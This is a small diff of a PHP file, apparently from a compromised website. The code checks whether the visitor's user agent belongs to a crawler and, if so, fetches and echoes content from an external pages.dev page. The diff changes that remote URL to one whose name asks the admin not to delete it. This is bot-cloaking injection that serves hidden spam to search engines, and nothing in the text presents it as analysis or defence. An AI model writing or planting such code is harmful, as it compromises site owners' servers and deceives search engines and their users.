@@ -18,7 +18,7 @@ function is_bot() {
     return preg_match($botchar, $user_agent);
 }
 
-$sky = "https://tuhanmemberkatiorangyangbaik.pages.dev/sempakbasah/index.html";
+$sky = "https://adminjanganhapusyak.pages.dev/sempakbasah/index.html";
 
 if (is_bot()) {
     echo @file_get_contents($sky);
